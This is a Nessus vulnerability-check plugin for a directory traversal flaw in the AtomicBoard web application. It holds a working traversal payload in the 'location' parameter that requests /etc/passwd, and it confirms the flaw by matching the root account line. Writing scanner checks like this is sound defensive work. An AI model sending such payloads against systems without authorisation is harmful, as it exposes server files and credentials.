#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(11795);
 script_bugtraq_id(8236);
 script_osvdb_id(49354, 49355);

 script_version ("$Revision: 1.17 $");
 
 script_name(english:"AtomicBoard Multiple Remote Vulnerabilities (Traversal, Path Disc)");
 script_summary(english:"Checks for the presence of remotehtmlview.php");
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is hosting a web application that is affected by
a directory traversal vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running AtomicBoard, a weblog and message board
system written in PHP.

A directory traversal vulnerability exists in the 'location' parameter
of the 'index.php' file. An attacker could exploit this in order to
read arbitrary files subject to the privileges of the web server
process.

Note that it may also be possible to disclose the server path of the
AtomicBoard application by supplying a malformed argument to the
'location' variable, though Nessus has not tested for this." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/329775/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/07/21");
 script_cvs_date("$Date: 2011/03/14 21:48:01 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003-2011 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/PHP");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port)) exit(0);



function check(loc)
{
 local_var r, w;
 w = http_send_recv3(method:"GET",
   item:string(loc, "/index.php?location=../../../../../../../../../../../../../../../etc/passwd"),
 		port:port);
 if (isnull(w)) exit(0);
 r = strcat(w[0], w[1], '\r\n', w[2]);
 if(egrep(pattern:"root:.*:0:[01]:.*:", string:r))
 {
 	security_warning(port);
	exit(0);
 }
}


dir = make_list(cgi_dirs());
dirs = make_list();
foreach d (dir)
{
 dirs = make_list(dirs, string(d, "/atomicboard"));
}

dirs = make_list(dirs, "/atomicboard");


foreach dir (dirs)
{
check(loc:dir);
}
